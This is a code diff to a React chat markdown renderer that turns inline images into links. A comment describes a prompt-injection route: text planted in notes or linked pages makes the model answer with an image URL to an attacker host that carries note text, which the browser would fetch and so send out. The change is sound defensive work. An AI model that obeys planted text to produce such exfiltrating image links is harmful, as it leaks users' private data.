@@ -1,6 +1,7 @@
 import type { ComponentProps } from "react";
 import type { Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
+import { safeExternalUrl } from "@/lib/safe-url";
 
 /**
  * Shared markdown plumbing for chat surfaces (global FAB + people conversation).
@@ -53,6 +54,20 @@ export const chatMarkdownComponents: Components = {
   a: ({ node: _node, ...props }: ComponentProps<"a"> & { node?: unknown }) => (
     <a {...props} className="underline underline-offset-2 hover:opacity-80" target="_blank" rel="noreferrer" />
   ),
+  // An image in a reply loads the moment it renders, with no click. The model
+  // reads notes written by apps and bots and web pages the user links, so text
+  // planted there could make it answer with ![](https://attacker/?d=<note
+  // text>) and the browser would send that text out. Images become links.
+  img: ({ src, alt }: ComponentProps<"img"> & { node?: unknown }) => {
+    const href = safeExternalUrl(src);
+    const label = alt?.trim() ? `Image: ${alt.trim()}` : "Open image";
+    if (!href) return <span>{label}</span>;
+    return (
+      <a href={href} className="underline underline-offset-2 hover:opacity-80" target="_blank" rel="noreferrer">
+        {label}
+      </a>
+    );
+  },
   table: ({ node: _node, ...props }: ComponentProps<"table"> & { node?: unknown }) => (
     <div className="my-2 -mx-1 overflow-x-auto">
       <table {...props} className="w-full border-collapse text-xs" />
